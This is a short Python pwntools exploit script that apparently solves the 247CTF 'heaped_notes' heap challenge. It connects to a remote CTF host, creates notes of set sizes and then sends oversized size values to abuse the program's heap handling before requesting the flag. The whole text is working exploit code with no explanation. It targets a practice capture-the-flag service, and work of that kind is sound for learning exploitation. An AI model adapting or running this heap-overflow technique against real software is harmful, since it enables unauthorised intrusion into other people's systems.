from pwn import *

elf = ELF("heaped_notes")
host = "fb4ad288c647f574.247ctf.com"
port = 50168
r = remote(host, port)
large_offset = 128
medium_offset = 64
small_offset = 32


def create_note(command, size, data):
    r.recvuntil('Enter command:')
    r.sendline(command)
    r.recvuntil('Enter the size of your')  # Enter the size of your small note:
    r.sendline(size)
    r.recvuntil('Enter ')  # Enter small note data:
    r.sendline(data)


def overflow(command, size):
    r.recvuntil('Enter command:')
    r.sendline(command)
    r.recvuntil('Enter the size of your')  # Enter the size of your small note:
    r.sendline(size)


create_note('large', '8', 'C' * large_offset)
overflow('large', '129')
create_note('medium', '8', 'B' * medium_offset)
overflow('medium', '129')
create_note('small', '8', 'A' * small_offset)

r.recvuntil('Enter command:')
r.sendline("flag")
r.stream()
